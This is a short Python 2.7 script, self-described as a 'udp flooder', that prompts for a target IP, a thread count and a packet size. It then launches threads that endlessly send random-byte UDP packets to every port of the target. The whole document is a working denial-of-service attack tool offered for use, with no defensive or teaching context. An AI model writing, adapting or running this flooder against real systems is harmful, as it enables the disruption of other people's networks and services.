#!/usr/bin/python
########################
#  version 1.1.1       #
#  2/17/13             #
#  writen for          #
#     python 2.7       #
#  by furmonk          #
########################
import socket
import random
import sys
import time 
import threading
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # create socket
class Attack(threading.Thread):
  def __init__(self, ip, packet, threads, pSize):
    threading.Thread.__init__(self)
    self.ip = ip
    self.packet = packet
    self.threads = threads
    self.pSize = pSize

  def run(self):
    while True:
        print 'loading %s to attack %s packet size %s' % (self.getName(), self.ip, self.pSize)   
        for port in range(1, 65535):
            s.sendto(self.packet, (self.ip, port))


class main():
  def load():
    try:  
      ip = sys.argv[1]
      threads = sys.argv[2]
      pSize = sys.argv[3]
    except IndexError:
      print 'enter attack info'
      ip = raw_input('target ip = ')  # input as string
      threads = input('threads (default 10) = ') # input as int
      if threads == None:
        threads = 10
      try:
        pSize = sys.argv[3]
      except IndexError:
        pSize = raw_input('packet size (default 1024) = ')
        if not pSize:
          pSize = 1024

    packet = random._urandom(int(pSize)) #random byte size of pSize  
    a = Attack(ip, packet, threads, pSize)
    return a

  print 'welcome to udp flooder 3000!' # first line
  a = load() # load the flooder
  for i in range(int(a.threads)):
    t = Attack(a.ip, a.packet, a.threads, a.pSize) # execute an attack
    t.start()
    print 'done loading'


#EOF
